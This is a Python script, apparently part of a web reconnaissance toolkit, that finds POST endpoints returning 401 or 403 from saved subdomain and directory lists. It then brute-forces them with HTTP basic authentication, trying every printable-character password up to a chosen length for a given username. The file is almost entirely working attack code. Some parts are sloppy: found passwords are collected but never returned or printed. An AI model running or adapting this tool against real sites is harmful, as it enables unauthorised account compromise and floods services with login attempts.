"""
This module contains the functions that are used to crack the passwords of the
websites that require authentication
It can also be run as a standalone file for the domains listed in output_files/ dir
"""

import itertools
import argparse
import string
import sys
import requests
from tqdm import tqdm
from multiprocessing import cpu_count
from concurrent.futures import ThreadPoolExecutor
from threading import Lock


def argumentParser():
	"""
	Parses the arguments given to the script
	Returns:
		arguments (argparse.Namespace): Namespace object containing the arguments
	"""

	threads = cpu_count() - 2 if cpu_count() > 4 else 1
	parser = argparse.ArgumentParser(
		description="Simple script to crack the passwords of websites that require authentication",
		formatter_class=argparse.RawTextHelpFormatter
	)

	# Required argument: domain
	parser.add_argument("-u", "--username", help="Username to be used for the attack\n\n", required=True)

	# Optional argument: password_length
	parser.add_argument("-l", "--password-length", help="Length of the password to bruteforce (default: 8)\n\n",
	                    default=8, type=int)

	# Optional argument: threads
	parser.add_argument("-t", "--threads", help=f"Number of threads to be used for the attack (default: {threads})\n\n",
	                    default=threads, type=int)

	return parser.parse_args()


def bruteForce(post_dirs, username, password_length):
	"""
	Attempts to bruteforce the POST endpoint using a given username and a brute-forcing script
	Args:
		 post_dirs (list): list of urls that require authentication
		 username (str): username to be used for the attack
		 password_length (int): maximum length of the password we wish to bruteforce
	Returns:
		 None
	"""

	bypassed_endpoints = {}
	chars = string.printable
	for url in post_dirs:
		for combo in generatePasswords(chars, password_length):
			try:
				request = requests.post(url, auth=(username, combo))
			except requests.exceptions.ConnectionError:
				continue
			if request.status_code not in [401, 403]:
				bypassed_endpoints[url] = f"password: {combo}"


def generatePasswords(chars, password_length):
	"""
	Generator function that yields a list of password to use in a bruteforce attack
	Args:
		chars (str): string containing all characters we want to use in our bruteforce attack
		password_length (int): maximum length of the password we want to generate
	Yields:
		combination (str): the yielded password to be iterated over in the bruteforce attack
	"""

	for length in range(1, password_length + 1):
		for combination in itertools.product(chars, repeat=length):
			yield ''.join(combination)


def loadDomainsFromFile():
	"""
	Loads the valid subdomains and directories from their respective files
	Returns:
		valid_subdomains (list): list of valid subdomains
		valid_dirs (list): list of valid directories
	"""

	try:
		with open("output_files/valid_subdomains.bat", "r") as f:
			valid_subdomains = f.read().splitlines()

		with open("output_files/valid_dirs.bat", "r") as f:
			valid_dirs = f.read().splitlines()
	except FileNotFoundError:
		print("Output_files directory not present, exiting...")
		sys.exit(1)

	return valid_subdomains, valid_dirs


def checkPostDirs(valid_dirs, valid_subdomains, pbar, lock):
	"""
	Checks which domains in the given lists support POST methods and which ones require authentication
	Args:
		pbar (tqdm.tqdm): tqdm progress bar object
		lock (threading.Lock): lock object to synchronize the threads
		valid_dirs (list): list of valid directories
		valid_subdomains (list): list of valid subdomains

	Returns:
		post_dirs (list): list of urls that support POST methods and require authentication
	"""

	# Initialize a list to store the urls that support POST methods and require authentication and add together the
	# valid directories and subdomains
	post_dirs = []
	valid_urls = valid_dirs + valid_subdomains

	for domain in valid_urls:
		with lock:
			pbar.update(1)
		try:
			post_request = requests.post(domain)
		except requests.exceptions.ConnectionError:
			continue
		if post_request.status_code in [401, 403]:
			post_dirs.append(domain)

	return post_dirs


def main():
	args = argumentParser()

	valid_subdomains, valid_dirs = loadDomainsFromFile()

	# Divide the lists into chunks for the workers
	max_workers = args.threads
	divided_dirs = [valid_dirs[i::max_workers] for i in range(max_workers)]
	divided_subdomains = [valid_subdomains[i::max_workers] for i in range(max_workers)]

	# Create the workers
	total_iterations = len(valid_dirs) + len(valid_subdomains)
	workers = []

	# Pass the divided lists to the workers
	with tqdm(total=total_iterations, desc="Checking URLs for POST support", unit="URLs", dynamic_ncols=True) as pbar, \
			ThreadPoolExecutor(max_workers=max_workers) as executor:
		lock = Lock()
		for i in range(max_workers):
			workers.append(executor.submit(checkPostDirs, divided_dirs[i], divided_subdomains[i], pbar, lock))

	# Merge the results from the workers
	post_dirs = []
	for worker in workers:
		post_dirs.extend(worker.result())
	if len(post_dirs) == 0:
		print("No POST endpoint found that require authentication")
	else:
		print(f"Found {len(post_dirs)} POST directories that require authentication")

	input_file = args.username
	password_length = args.password_length
	bruteForce(post_dirs, input_file, password_length)


if __name__ == "__main__":
	main()
